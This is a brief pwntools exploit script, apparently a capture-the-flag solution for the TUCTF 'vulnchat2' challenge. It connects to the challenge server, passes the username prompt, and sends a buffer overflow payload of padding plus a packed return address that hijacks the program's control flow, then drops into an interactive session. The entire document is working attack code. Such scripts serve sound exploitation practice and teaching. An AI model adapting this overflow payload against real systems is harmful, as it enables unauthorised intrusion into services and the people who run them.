from pwn import *

r = remote('vulnchat2.tuctf.com', 4242)
r.recvuntil('Enter your username: ')
r.sendline('name')
r.recvuntil('name: ')
r.sendline('1'*(0x27 + 4)+p32(0x8048672))
r.interactive()
